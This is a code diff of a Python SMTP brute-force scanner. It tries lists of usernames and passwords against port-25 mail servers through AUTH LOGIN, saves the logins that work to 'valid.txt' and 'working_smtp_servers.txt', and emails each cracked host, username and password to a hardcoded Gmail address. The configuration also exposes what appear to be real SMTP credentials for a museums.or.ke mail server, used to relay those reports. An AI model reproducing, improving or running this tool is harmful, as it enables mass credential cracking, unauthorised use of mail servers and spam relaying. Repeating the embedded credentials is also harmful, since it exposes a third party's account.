@@ -17,8 +17,6 @@ import logging
 from datetime import datetime, timedelta
 import json
 import os
-import ssl
-from contextlib import contextmanager
 
 # --- SMTP CONFIGURATION (EDIT THESE) ---
 SMTP_SERVER = "mail.museums.or.ke"
@@ -28,19 +26,17 @@ SMTP_PASS = "onesmus@2022"
 NOTIFY_EMAIL = "skkho87.sm@gmail.com"
 # ---------------------------------------
 
-# --- SCANNER SETTINGS ---
-TIMEOUT_SECONDS = 15
-MAX_RETRIES = 2
-VALIDATE_AUTH_ONLY = True  # Only save servers with valid authentication
-ENABLE_NOTIFICATIONS = True
-MIN_NOTIFICATION_INTERVAL = 300  # 5 minutes
-MAX_NOTIFICATIONS_PER_HOUR = 10
-# ------------------------
+# --- NOTIFICATION SETTINGS ---
+MIN_NOTIFICATION_INTERVAL = 300  # 5 minutes between notifications for same host
+MAX_NOTIFICATIONS_PER_HOUR = 20  # Maximum notifications per hour
+ONLY_NOTIFY_WORKING_SMTP = True  # Only notify for servers with valid authentication
+NOTIFY_LIVE_SERVERS = False      # Set to True if you want notifications for just live servers
+# -----------------------------
 
-# Setup enhanced logging
+# Setup logging
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s',
+    format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
         logging.FileHandler('smtp_scanner.log'),
         logging.StreamHandler()
@@ -48,78 +44,156 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-class NotificationManager:
-    """Handles email notifications with rate limiting"""
-    
-    def __init__(self):
-        self.tracker = {
-            'last_notification_time': {},
-            'hourly_count': 0,
-            'hour_start': datetime.now()
+# Notification tracking
+notification_tracker = {
+    'last_notification_time': {},
+    'hourly_count': 0,
+    'hour_start': datetime.now()
+}
+
+# Load notification history if exists
+notification_file = 'notification_history.json'
+if os.path.exists(notification_file):
+    try:
+        with open(notification_file, 'r') as f:
+            notification_tracker = json.load(f)
+            # Convert string timestamps back to datetime objects
+            for host in notification_tracker.get('last_notification_time', {}):
+                notification_tracker['last_notification_time'][host] = datetime.fromisoformat(
+                    notification_tracker['last_notification_time'][host]
+                )
+            notification_tracker['hour_start'] = datetime.fromisoformat(notification_tracker['hour_start'])
+    except Exception as e:
+        logger.warning(f"Could not load notification history: {e}")
+
+def save_notification_history():
+    """Save notification tracking data"""
+    try:
+        data = notification_tracker.copy()
+        # Convert datetime objects to strings for JSON serialization
+        data['last_notification_time'] = {
+            host: dt.isoformat() for host, dt in data['last_notification_time'].items()
         }
-        self.load_history()
-    
-    def load_history(self):
-        """Load notification history from file"""
-        try:
-            if os.path.exists('notification_history.json'):
-                with open('notification_history.json', 'r') as f:
-                    data = json.load(f)
-                    self.tracker['hourly_count'] = data.get('hourly_count', 0)
-                    self.tracker['hour_start'] = datetime.fromisoformat(data.get('hour_start', datetime.now().isoformat()))
-                    for host, timestamp in data.get('last_notification_time', {}).items():
-                        self.tracker['last_notification_time'][host] = datetime.fromisoformat(timestamp)
-        except Exception as e:
-            logger.warning(f"Could not load notification history: {e}")
-    
-    def save_history(self):
-        """Save notification history to file"""
-        try:
-            data = {
-                'hourly_count': self.tracker['hourly_count'],
-                'hour_start': self.tracker['hour_start'].isoformat(),
-                'last_notification_time': {
-                    host: dt.isoformat() for host, dt in self.tracker['last_notification_time'].items()
-                }
-            }
-            with open('notification_history.json', 'w') as f:
-                json.dump(data, f, indent=2)
-        except Exception as e:
-            logger.error(f"Could not save notification history: {e}")
-    
-    def can_notify(self, host):
-        """Check if notification can be sent based on rate limits"""
-        now = datetime.now()
+        data['hour_start'] = data['hour_start'].isoformat()
         
-        # Reset hourly counter
-        if now - self.tracker['hour_start'] > timedelta(hours=1):
-            self.tracker['hourly_count'] = 0
-            self.tracker['hour_start'] = now
+        with open(notification_file, 'w') as f:
+            json.dump(data, f, indent=2)
+    except Exception as e:
+        logger.error(f"Could not save notification history: {e}")
+
+# Initialize files if 'a' argument is provided
+if len(sys.argv) > 1 and str(sys.argv[1]) == 'a':
+    with open('ips.txt', 'a', encoding='utf-8'):
+        pass
+    with open('users.txt', 'a', encoding='utf-8'):
+        pass
+    with open('pass.txt', 'a', encoding='utf-8'):
+        pass
+    logger.info("Initialized input files")
+    sys.exit(1)
+
+# Validate command line arguments
+if len(sys.argv) != 4:
+    print("Usage: python smtp_scanner.py <threads> <verbose> <debug>")
+    print("Example: python smtp_scanner.py 10 bad d1")
+    sys.exit(1)
+
+try:
+    ThreadNumber = int(sys.argv[1])
+    Verbose = str(sys.argv[2])
+    Dbg = str(sys.argv[3])
+except ValueError:
+    logger.error("Invalid thread number provided")
+    sys.exit(1)
+
+# Initialize output files
+bad = open('bad.txt', 'w', encoding='utf-8')
+val = open('valid.txt', 'a', encoding='utf-8')
+live_servers = open('live_smtp_servers.txt', 'a', encoding='utf-8')
+working_smtp = open('working_smtp_servers.txt', 'a', encoding='utf-8')  # New file for fully working SMTPs
+
+# Load already cracked hosts to avoid duplicates
+cracked = []
+try:
+    with open('valid.txt', 'r', encoding='utf-8') as vff:
+        alreadycracked = vff.read().splitlines()
+        if len(alreadycracked) > 0:
+            for bruted in alreadycracked:
+                if ' ' in bruted:
+                    cracked.append(bruted.split(" ")[0])
+except FileNotFoundError:
+    logger.info("No existing valid.txt file found")
+
+# Load subdomain list
+subs = []
+try:
+    with open('subs.txt', 'r', encoding='utf-8') as sf:
+        subs = sf.read().splitlines()
+except FileNotFoundError:
+    logger.warning("subs.txt not found, using default subdomain handling")
+    subs = ['.com', '.org', '.net', '.edu', '.gov']
+
+def GetDomainFromBanner(banner):
+    """Extract domain from SMTP banner"""
+    try:
+        if banner.startswith("220 "):
+            TempBanner = banner.split(" ")[1]
+        elif banner.startswith("220-"):
+            TempBanner = banner.split(" ")[0].split("220-")[1]
+        else:
+            TempBanner = banner
         
-        # Check hourly limit
-        if self.tracker['hourly_count'] >= MAX_NOTIFICATIONS_PER_HOUR:
+        FirstDomain = TempBanner.rstrip()
+        
+        # Check for known subdomains
+        for sd in subs:
+            if FirstDomain.endswith(sd):
+                LastDomain = ".".join(FirstDomain.split(".")[-3:])
+                return LastDomain
+        
+        # Default to last two parts
+        LastDomain = ".".join(FirstDomain.split(".")[-2:])
+        return LastDomain
+    except Exception as e:
+        logger.error(f"Error parsing banner: {e}")
+        return "unknown.domain"
+
+def can_send_notification(host):
+    """Check if we can send notification based on rate limiting"""
+    now = datetime.now()
+    
+    # Reset hourly counter if needed
+    if now - notification_tracker['hour_start'] > timedelta(hours=1):
+        notification_tracker['hourly_count'] = 0
+        notification_tracker['hour_start'] = now
+    
+    # Check hourly limit
+    if notification_tracker['hourly_count'] >= MAX_NOTIFICATIONS_PER_HOUR:
+        logger.warning("Hourly notification limit reached")
+        return False
+    
+    # Check per-host interval
+    if host in notification_tracker['last_notification_time']:
+        time_since_last = now - notification_tracker['last_notification_time'][host]
+        if time_since_last.total_seconds() < MIN_NOTIFICATION_INTERVAL:
+            logger.debug(f"Too soon to notify about {host} again")
             return False
-        
-        # Check per-host interval
-        if host in self.tracker['last_notification_time']:
-            time_since_last = now - self.tracker['last_notification_time'][host]
-            if time_since_last.total_seconds() < MIN_NOTIFICATION_INTERVAL:
-                return False
-        
-        return True
     
-    def send_notification(self, subject, body, host):
-        """Send email notification with rate limiting"""
-        if not ENABLE_NOTIFICATIONS or not self.can_notify(host):
-            return False
+    return True
+
+def send_email_notification(subject, body, host):
+    """Send email notification for important findings with rate limiting"""
+    if not can_send_notification(host):
+        return False
+    
+    try:
+        msg = MIMEMultipart()
+        msg['Subject'] = f"[SMTP Scanner] {subject}"
+        msg['From'] = SMTP_USER
+        msg['To'] = NOTIFY_EMAIL
         
-        try:
-            msg = MIMEMultipart()
-            msg['Subject'] = f"[SMTP Scanner] {subject}"
-            msg['From'] = SMTP_USER
-            msg['To'] = NOTIFY_EMAIL
-            
-            enhanced_body = f"""SMTP Scanner Alert
+        # Add timestamp and scanner info to body
+        enhanced_body = f"""SMTP Scanner Alert
 ========================
 
 {body}
@@ -127,449 +201,325 @@ class NotificationManager:
 Scanner Details:
 - Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 - Scanner Host: {socket.gethostname()}
+- Thread Count: {ThreadNumber}
 
 This is an automated notification from your SMTP scanner.
 """
-            
-            msg.attach(MIMEText(enhanced_body, 'plain'))
+        
+        msg.attach(MIMEText(enhanced_body, 'plain'))
 
-            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-                server.starttls()
-                server.login(SMTP_USER, SMTP_PASS)
-                server.sendmail(SMTP_USER, [NOTIFY_EMAIL], msg.as_string())
-            
-            # Update tracking
-            self.tracker['last_notification_time'][host] = datetime.now()
-            self.tracker['hourly_count'] += 1
-            self.save_history()
-            
-            logger.info(f"Email notification sent: {subject}")
-            return True
-        except Exception as e:
-            logger.error(f"Failed to send email notification: {e}")
-            return False
+        server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
+        server.starttls()
+        server.login(SMTP_USER, SMTP_PASS)
+        server.sendmail(SMTP_USER, [NOTIFY_EMAIL], msg.as_string())
+        server.quit()
+        
+        # Update tracking
+        notification_tracker['last_notification_time'][host] = datetime.now()
+        notification_tracker['hourly_count'] += 1
+        save_notification_history()
+        
+        logger.info(f"Email notification sent: {subject}")
+        return True
+    except Exception as e:
+        logger.error(f"Failed to send email notification: {e}")
+        return False
 
-class SMTPValidator:
-    """Validates SMTP servers and tests authentication"""
-    
-    def __init__(self):
-        self.common_domains = ['.com', '.org', '.net', '.edu', '.gov', '.co.uk', '.de', '.fr']
-    
-    @contextmanager
-    def smtp_connection(self, host, port=25, timeout=TIMEOUT_SECONDS):
-        """Context manager for SMTP connections"""
-        sock = None
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(timeout)
-            sock.connect((host, port))
-            yield sock
-        except Exception as e:
-            logger.debug(f"Connection failed to {host}:{port} - {e}")
-            raise
-        finally:
-            if sock:
-                try:
-                    sock.close()
-                except:
-                    pass
-    
-    def extract_domain_from_banner(self, banner):
-        """Extract domain from SMTP banner"""
-        try:
-            if banner.startswith("220 "):
-                domain_part = banner.split(" ")[1]
-            elif banner.startswith("220-"):
-                domain_part = banner.split(" ")[0].split("220-")[1]
-            else:
-                domain_part = banner.strip()
+def check_smtp_live(host, timeout=10):
+    """Check if SMTP server is live and responding"""
+    try:
+        S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        S.settimeout(timeout)
+        S.connect((host, 25))
+        banner = S.recv(1024).decode(errors='ignore')
+        S.close()
+        
+        if banner[:3] == '220':
+            return True, banner.strip()
+        return False, banner.strip()
+    except Exception as e:
+        return False, str(e)
+
+def validate_smtp_server(host, timeout=15):
+    """Perform more thorough SMTP server validation"""
+    try:
+        S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        S.settimeout(timeout)
+        S.connect((host, 25))
+        
+        # Read banner
+        banner = S.recv(1024).decode(errors='ignore')
+        if banner[:3] != '220':
+            S.close()
+            return False, "Invalid banner response"
+        
+        # Test EHLO
+        S.send(b'EHLO scanner-test\r\n')
+        ehlo_response = S.recv(2048).decode(errors='ignore')
+        
+        # Test QUIT
+        S.send(b'QUIT\r\n')
+        S.recv(256)
+        S.close()
+        
+        if '250' in ehlo_response:
+            return True, f"Banner: {banner.strip()}, EHLO: OK"
+        else:
+            return False, f"EHLO failed: {ehlo_response.strip()}"
             
-            domain_part = domain_part.rstrip()
-            
-            # Check for known TLDs
-            for tld in self.common_domains:
-                if domain_part.endswith(tld):
-                    parts = domain_part.split(".")
-                    if len(parts) >= 2:
-                        return ".".join(parts[-2:])
-            
-            # Default fallback
-            parts = domain_part.split(".")
-            if len(parts) >= 2:
-                return ".".join(parts[-2:])
-            
-            return domain_part
-        except Exception:
-            return "unknown.domain"
-    
-    def test_smtp_connection(self, host, port=25):
-        """Test basic SMTP connectivity"""
-        try:
-            with self.smtp_connection(host, port) as sock:
-                banner = sock.recv(1024).decode(errors='ignore').strip()
-                
-                if not banner.startswith('220'):
-                    return False, f"Invalid banner: {banner[:50]}"
-                
-                # Test EHLO
-                sock.send(b'EHLO test.scanner\r\n')
-                ehlo_response = sock.recv(2048).decode(errors='ignore')
-                
-                # Clean disconnect
-                sock.send(b'QUIT\r\n')
-                sock.recv(256)
-                
-                if '250' in ehlo_response:
-                    return True, banner
-                else:
-                    return False, f"EHLO failed: {ehlo_response[:50]}"
-                    
-        except Exception as e:
-            return False, str(e)
-    
-    def test_authentication(self, host, user, password, banner=""):
-        """Test SMTP authentication with given credentials"""
-        try:
-            with self.smtp_connection(host, 25) as sock:
-                # Read banner
-                if not banner:
-                    banner = sock.recv(1024).decode(errors='ignore').strip()
-                
-                if not banner.startswith('220'):
-                    return False, {}
-                
-                # EHLO
-                sock.send(b'EHLO auth.test\r\n')
-                ehlo_data = sock.recv(2048).decode(errors='ignore')
-                if '250' not in ehlo_data:
-                    return False, {}
-                
-                # Extract domain and create full email
-                domain = self.extract_domain_from_banner(banner)
-                full_email = f"{user}@{domain}"
-                
-                # Test AUTH LOGIN
-                sock.send(b'AUTH LOGIN\r\n')
-                auth_response = sock.recv(256).decode(errors='ignore')
-                if not auth_response.startswith('334'):
-                    return False, {}
-                
-                # Send username (base64 encoded)
-                username_b64 = base64.b64encode(full_email.encode()).decode()
-                sock.send(f"{username_b64}\r\n".encode())
-                sock.recv(256)
-                
-                # Send password (base64 encoded)
-                password_b64 = base64.b64encode(password.encode()).decode()
-                sock.send(f"{password_b64}\r\n".encode())
-                final_response = sock.recv(256).decode(errors='ignore')
-                
-                # Clean disconnect
-                sock.send(b'QUIT\r\n')
-                sock.recv(256)
-                
-                if final_response.startswith('235'):
-                    return True, {
-                        'host': host,
-                        'username': full_email,
-                        'password': password,
-                        'banner': banner,
-                        'domain': domain,
-                        'timestamp': datetime.now().isoformat()
-                    }
-                
-                return False, {}
-                
-        except Exception as e:
-            logger.debug(f"Authentication test failed for {host}: {e}")
-            return False, {}
+    except Exception as e:
+        return False, str(e)
 
 class SMTPScanner(threading.Thread):
-    """Main SMTP scanning thread"""
-    
-    def __init__(self, task_queue, result_queue, validator, notification_mgr):
+    def __init__(self, queue):
         threading.Thread.__init__(self)
-        self.task_queue = task_queue
-        self.result_queue = result_queue
-        self.validator = validator
-        self.notification_mgr = notification_mgr
-        self.daemon = True
-    
+        self.queue = queue
+
     def run(self):
         while True:
-            try:
-                task = self.task_queue.get(timeout=1)
-                if task is None:  # Poison pill
-                    break
-                
-                host, user, password = task
-                self.scan_host(host, user, password)
-                self.task_queue.task_done()
-                
-            except queue.Empty:
-                continue
-            except Exception as e:
-                logger.error(f"Scanner thread error: {e}")
-    
-    def scan_host(self, host, user, password):
-        """Scan a single host with given credentials"""
-        try:
-            # First test basic connectivity
-            is_live, banner_or_error = self.validator.test_smtp_connection(host)
-            
-            if not is_live:
-                logger.debug(f"Host {host} not responding: {banner_or_error}")
-                return
-            
-            logger.info(f"Live SMTP found: {host}")
-            
-            # If we have credentials, test authentication
-            if user and password:
-                auth_success, auth_data = self.validator.test_authentication(host, user, password, banner_or_error)
-                
-                if auth_success:
-                    logger.info(f"AUTHENTICATED SMTP: {host} - {auth_data['username']}")
-                    
-                    # Add to results
-                    self.result_queue.put(('authenticated', auth_data))
-                    
-                    # Send notification
-                    subject = f"Working SMTP Found: {host}"
-                    body = f"""Host: {host}
-Username: {auth_data['username']}
-Password: {auth_data['password']}
-Domain: {auth_data['domain']}
-Banner: {auth_data['banner'][:100]}...
+            Host, user, passwd = self.queue.get()
+            self.scan_host(Host, user, passwd)
+            self.queue.task_done()
 
-This server has been verified as working with authentication."""
+    def scan_host(self, host, user, passwd):
+        try:
+            # Skip if already processed
+            if host in cracked:
+                return False
+
+            # First, check if SMTP server is live and properly responding
+            is_valid, validation_info = validate_smtp_server(host)
+            
+            if not is_valid:
+                if Verbose == 'bad':
+                    bad.write(f"{host} - {validation_info}\n")
+                    bad.flush()
+                return False
+            
+            # Log live server
+            live_servers.write(f"{host} - {validation_info}\n")
+            live_servers.flush()
+            
+            if Dbg in ["d1", "d3", "d4"]:
+                print(f"[LIVE] {host} - {validation_info}")
+            
+            # ONLY send notifications for authenticated working SMTP servers
+            # Skip notification for just live servers
+
+            # Now attempt authentication if credentials provided
+            if user and passwd:
+                auth_result, auth_details = self.test_authentication(host, user, passwd, validation_info)
+                if auth_result:
+                    cracked.append(host)
                     
-                    self.notification_mgr.send_notification(subject, body, host)
-                else:
-                    logger.debug(f"Authentication failed for {host} with {user}")
+                    # Log to working SMTP file
+                    working_smtp.write(f"{host} {auth_details['user']} {auth_details['password']} - {validation_info}\n")
+                    working_smtp.flush()
+                    
+                    # ONLY send notification for authenticated working SMTP servers
+                    if ONLY_NOTIFY_WORKING_SMTP:
+                        subject = f"Authenticated SMTP Server Found: {host}"
+                        body = f"""Host: {host}
+User: {auth_details['user']}
+Password: {auth_details['password']}
+Validation: {validation_info}
+Status: AUTHENTICATED WORKING SMTP SERVER
+Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"""
+                        
+                        send_email_notification(subject, body, host)
+                    return True
+            
+            return True
             
         except Exception as e:
-            logger.error(f"Error scanning {host}: {e}")
+            if Dbg in ["d2", "d3"]:
+                logger.error(f"Error scanning {host}: {e}")
+            return False
 
-class ResultHandler:
-    """Handles saving results to files"""
-    
-    def __init__(self):
-        self.working_smtp_file = 'working_smtp_servers.txt'
-        self.live_smtp_file = 'live_smtp_servers.txt'
-        self.summary_file = 'scan_summary.json'
-    
-    def save_working_smtp(self, auth_data):
-        """Save working SMTP server details"""
+    def test_authentication(self, host, user, passwd, validation_info):
+        """Test SMTP authentication"""
         try:
-            with open(self.working_smtp_file, 'a', encoding='utf-8') as f:
-                line = f"{auth_data['host']}|{auth_data['username']}|{auth_data['password']}|{auth_data['domain']}|{auth_data['timestamp']}\n"
-                f.write(line)
-                f.flush()
-            logger.info(f"Saved working SMTP: {auth_data['host']}")
+            S = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            S.settimeout(15)
+            S.connect((host, 25))
+            
+            # Read banner
+            banner_response = S.recv(1024).decode(errors='ignore')
+            if banner_response[:3] != '220':
+                S.close()
+                return False, {}
+
+            # Send EHLO
+            S.send(b'EHLO scanner\r\n')
+            data = S.recv(2048).decode(errors='ignore')
+            if '250' not in data:
+                S.send(b'QUIT\r\n')
+                S.close()
+                return False, {}
+
+            # Get domain from banner
+            dom = GetDomainFromBanner(banner_response)
+            userd = f"{user}@{dom}"
+            
+            # Try each password
+            for pwd in passwd.split("|"):
+                pwd2 = pwd
+                if "%user%" in pwd:
+                    pwd2 = pwd.replace("%user%", user)
+                if "%User%" in pwd:
+                    pwd2 = pwd.replace("%User%", user.title())
+                
+                # Reset connection
+                S.send(b'RSET\r\n')
+                S.recv(256)
+                
+                # Attempt AUTH LOGIN
+                S.send(b'AUTH LOGIN\r\n')
+                data = S.recv(256).decode(errors='ignore')
+                if data[:3] != '334':
+                    continue
+                
+                if Dbg in ["d1", "d3"]:
+                    print(f"[AUTH] Testing {host} {userd} {pwd2}")
+
+                # Send username
+                S.send(base64.b64encode(userd.rstrip().encode()) + b'\r\n')
+                S.recv(256)
+                
+                # Send password
+                S.send(base64.b64encode(pwd2.encode()) + b'\r\n')
+                data = S.recv(256).decode(errors='ignore')
+                
+                if data[:3] == '235':
+                    # Authentication successful
+                    logger.info(f"Valid credentials found: {host} {userd} {pwd2}")
+                    val.write(f"{host} {userd} {pwd2}\n")
+                    val.flush()
+                    
+                    S.send(b'QUIT\r\n')
+                    S.close()
+                    
+                    return True, {
+                        'user': userd,
+                        'password': pwd2,
+                        'banner': banner_response.strip(),
+                        'validation': validation_info
+                    }
+            
+            S.send(b'QUIT\r\n')
+            S.close()
+            return False, {}
+            
         except Exception as e:
-            logger.error(f"Failed to save working SMTP: {e}")
+            logger.error(f"Authentication test failed for {host}: {e}")
+            return False, {}
+
+def main(users, passwords, thread_number):
+    """Main scanning function"""
+    logger.info(f"Starting SMTP scanner with {thread_number} threads")
+    logger.info(f"Notification settings: Only authenticated working SMTPs will be reported via email")
     
-    def create_download_file(self):
-        """Create a formatted downloadable file with working SMTPs"""
+    q = queue.Queue(maxsize=40000)
+    
+    # Start worker threads
+    for i in range(thread_number):
         try:
-            if not os.path.exists(self.working_smtp_file):
-                logger.warning("No working SMTP servers found")
-                return
-            
-            with open(self.working_smtp_file, 'r', encoding='utf-8') as f:
-                lines = f.readlines()
-            
-            # Create formatted output
-            download_content = []
-            download_content.append("=" * 60)
-            download_content.append("WORKING AUTHENTICATED SMTP SERVERS")
-            download_content.append("=" * 60)
-            download_content.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-            download_content.append(f"Total servers: {len(lines)}")
-            download_content.append("=" * 60)
-            download_content.append("")
-            
-            for i, line in enumerate(lines, 1):
-                if '|' in line:
-                    parts = line.strip().split('|')
-                    if len(parts) >= 4:
-                        host, username, password, domain = parts[:4]
-                        download_content.append(f"Server #{i}")
-                        download_content.append(f"Host: {host}")
-                        download_content.append(f"Username: {username}")
-                        download_content.append(f"Password: {password}")
-                        download_content.append(f"Domain: {domain}")
-                        download_content.append("-" * 40)
-            
-            # Save formatted file
-            with open('WORKING_SMTP_DOWNLOAD.txt', 'w', encoding='utf-8') as f:
-                f.write('\n'.join(download_content))
-            
-            logger.info(f"Created download file: WORKING_SMTP_DOWNLOAD.txt with {len(lines)} servers")
-            
+            t = SMTPScanner(q)
+            t.daemon = True
+            t.start()
         except Exception as e:
-            logger.error(f"Failed to create download file: {e}")
-
-def validate_input_files():
-    """Validate and create input files if needed"""
-    required_files = ['ips.txt', 'users.txt', 'pass.txt']
+            logger.error(f"Couldn't start {thread_number} threads! Started {i} instead!")
+            break
     
-    for filename in required_files:
-        if not os.path.exists(filename):
-            logger.warning(f"Creating empty {filename} file")
-            with open(filename, 'w', encoding='utf-8') as f:
-                if filename == 'ips.txt':
-                    f.write("# Add IP addresses or hostnames, one per line\n")
-                elif filename == 'users.txt':
-                    f.write("# Add usernames, one per line\nadmin\nmail\ntest\nuser\n")
-                elif filename == 'pass.txt':
-                    f.write("# Add passwords, one per line\npassword\n123456\nadmin\ntest\n")
-
-def load_input_data():
-    """Load hosts, users, and passwords from files"""
-    hosts, users, passwords = [], [], []
-    
+    # Load hosts and add to queue
     try:
-        with open('ips.txt', 'r', encoding='utf-8') as f:
-            hosts = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        with open('ips.txt', 'r', encoding='utf-8') as hosts_file:
+            hosts = hosts_file.read().splitlines()
+            
+        total_combinations = len(hosts) * len(users) * len(passwords)
+        logger.info(f"Processing {total_combinations} combinations across {len(hosts)} hosts")
         
-        with open('users.txt', 'r', encoding='utf-8') as f:
-            users = [line.strip() for line in f if line.strip() and not line.startswith('#')]
-        
-        with open('pass.txt', 'r', encoding='utf-8') as f:
-            passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+        for passwd in passwords:
+            for user in users:
+                for host in hosts:
+                    if host.strip():  # Skip empty lines
+                        q.put((host.strip(), user, passwd))
     
-    except FileNotFoundError as e:
-        logger.error(f"Required file not found: {e}")
-        return [], [], []
-    
-    logger.info(f"Loaded {len(hosts)} hosts, {len(users)} users, {len(passwords)} passwords")
-    return hosts, users, passwords
-
-def main():
-    """Main scanner function"""
-    print("Enhanced SMTP Scanner - Finding Working Authenticated Servers")
-    print("=" * 60)
-    
-    # Parse command line arguments
-    if len(sys.argv) < 2:
-        print("Usage: python smtp_scanner.py <threads> [verbose]")
-        print("Example: python smtp_scanner.py 10 verbose")
-        sys.exit(1)
-    
-    try:
-        thread_count = int(sys.argv[1])
-        verbose = len(sys.argv) > 2 and sys.argv[2].lower() == 'verbose'
-    except ValueError:
-        logger.error("Invalid thread count")
-        sys.exit(1)
-    
-    if verbose:
-        logging.getLogger().setLevel(logging.DEBUG)
-    
-    # Initialize components
-    validate_input_files()
-    hosts, users, passwords = load_input_data()
-    
-    if not hosts:
-        logger.error("No hosts to scan. Please add hosts to ips.txt")
+    except FileNotFoundError:
+        logger.error("ips.txt file not found!")
         return
     
-    validator = SMTPValidator()
-    notification_mgr = NotificationManager()
-    result_handler = ResultHandler()
+    # Wait for all tasks to complete
+    q.join()
+    logger.info("Scanning completed")
     
-    # Create task and result queues
-    task_queue = queue.Queue()
-    result_queue = queue.Queue()
-    
-    # Generate all combinations
-    total_tasks = 0
-    for host in hosts:
-        if users and passwords:
-            for user in users:
-                for password in passwords:
-                    task_queue.put((host, user, password))
-                    total_tasks += 1
-        else:
-            # Just test connectivity if no credentials
-            task_queue.put((host, '', ''))
-            total_tasks += 1
-    
-    logger.info(f"Starting scan with {thread_count} threads, {total_tasks} total tasks")
-    
-    # Start scanner threads
-    threads = []
-    for i in range(thread_count):
-        thread = SMTPScanner(task_queue, result_queue, validator, notification_mgr)
-        thread.start()
-        threads.append(thread)
-    
-    # Process results
-    working_count = 0
-    start_time = time.time()
-    
+    # Send summary notification ONLY for authenticated working SMTP servers
     try:
-        while True:
-            try:
-                result_type, data = result_queue.get(timeout=1)
-                
-                if result_type == 'authenticated':
-                    result_handler.save_working_smtp(data)
-                    working_count += 1
-                    print(f"[WORKING] {data['host']} - {data['username']} - Count: {working_count}")
-                
-            except queue.Empty:
-                # Check if all tasks are done
-                if task_queue.empty() and all(not t.is_alive() for t in threads):
-                    break
-                continue
-    
-    except KeyboardInterrupt:
-        logger.info("Scan interrupted by user")
-    
-    # Wait for tasks to complete
-    task_queue.join()
-    
-    # Stop threads
-    for _ in threads:
-        task_queue.put(None)  # Poison pill
-    
-    for thread in threads:
-        thread.join(timeout=5)
-    
-    # Create final downloadable file
-    result_handler.create_download_file()
-    
-    # Summary
-    elapsed_time = time.time() - start_time
-    logger.info(f"Scan completed in {elapsed_time:.2f} seconds")
-    logger.info(f"Found {working_count} working authenticated SMTP servers")
-    
-    if working_count > 0:
-        print(f"\n{'=' * 60}")
-        print(f"SUCCESS: Found {working_count} working SMTP servers!")
-        print(f"Check 'WORKING_SMTP_DOWNLOAD.txt' for formatted results")
-        print(f"Check 'working_smtp_servers.txt' for raw data")
-        print(f"{'=' * 60}")
+        with open('working_smtp_servers.txt', 'r') as f:
+            working_lines = f.readlines()
+            working_count = len([line for line in working_lines if line.strip()])
         
-        # Send summary notification
-        if ENABLE_NOTIFICATIONS:
-            subject = f"SMTP Scan Complete - {working_count} Working Servers"
-            body = f"""Scan completed successfully!
+        if working_count > 0:
+            subject = f"SMTP Scan Complete - {working_count} Authenticated Working Servers Found"
+            body = f"""Scan Summary:
+- Total authenticated working SMTP servers: {working_count}
+- Thread count used: {thread_number}
+- Scan completed at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-Results:
-- Working authenticated servers: {working_count}
-- Total scan time: {elapsed_time:.2f} seconds
-- Thread count: {thread_count}
+All results are saved to downloadable text files:
+- working_smtp_servers.txt (authenticated servers)
+- valid.txt (all valid credentials)
+- live_smtp_servers.txt (live servers)
 
-Files created:
-- WORKING_SMTP_DOWNLOAD.txt (formatted for download)
-- working_smtp_servers.txt (raw data)"""
-            
-            notification_mgr.send_notification(subject, body, "summary")
-    else:
-        print("\nNo working authenticated SMTP servers found.")
+Check working_smtp_servers.txt for authenticated SMTP servers only."""
+            send_email_notification(subject, body, "summary")
+        else:
+            logger.info("No authenticated working SMTP servers found - no email notification sent")
+    except Exception as e:
+        logger.error(f"Could not send summary notification: {e}")
 
 if __name__ == "__main__":
-    main()
+    # Load input files
+    try:
+        with open('users.txt', 'r', encoding='utf-8') as uf:
+            users = [line.strip() for line in uf.read().splitlines() if line.strip()]
+        
+        with open('pass.txt', 'r', encoding='utf-8') as pf:
+            passwords = [line.strip() for line in pf.read().splitlines() if line.strip()]
+        
+        if not users:
+            logger.warning("No users loaded, using empty user for live server detection only")
+            users = ['']
+        
+        if not passwords:
+            logger.warning("No passwords loaded, using empty password for live server detection only")
+            passwords = ['']
+        
+        logger.info(f"Loaded {len(users)} users and {len(passwords)} passwords")
+        logger.info("Email notifications will ONLY be sent for authenticated working SMTP servers")
+        
+        # Start main scanning
+        main(users, passwords, ThreadNumber)
+        
+    except FileNotFoundError as e:
+        logger.error(f"Required file not found: {e}")
+    except Exception as e:
+        logger.error(f"Unexpected error: {e}")
+    finally:
+        # Close file handles
+        bad.close()
+        val.close()
+        live_servers.close()
+        working_smtp.close()
+        save_notification_history()
+        
+        # Print final summary
+        try:
+            with open('working_smtp_servers.txt', 'r') as f:
+                authenticated_count = len([line for line in f.readlines() if line.strip()])
+            print(f"\n=== SCAN COMPLETE ===")
+            print(f"Authenticated working SMTP servers found: {authenticated_count}")
+            print(f"Results saved to: working_smtp_servers.txt")
+            print(f"All files are downloadable as .txt format")
+        except:
+            print("Scan completed - check output files for results")
